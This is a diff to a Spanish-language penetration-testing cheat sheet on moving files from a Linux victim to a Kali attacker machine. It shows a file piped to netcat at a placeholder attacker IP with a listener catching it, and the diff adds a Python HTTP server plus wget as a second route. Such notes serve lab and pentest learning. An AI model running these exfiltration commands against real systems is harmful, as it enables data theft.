@@ -197,12 +197,18 @@ EXTRA:
 
 ```bash 
 1. ❯ cat /ruta/al/archivo | nc IP_Kali 4444
+
+2. ❯ python3 -m http.server 80   
+   # Crear un servidor con python para la transferencia 
 ```
 
 ### Atacante Kali — Recibir desde Linux víctima
 
 ```bash 
 1. ❯ nc -lvnp 4444 > archivo_descargado
+
+2. ❯ wget http://IP_Linux_Victima/file 
+   # Descagar el archivo 
 ```
 
 ---
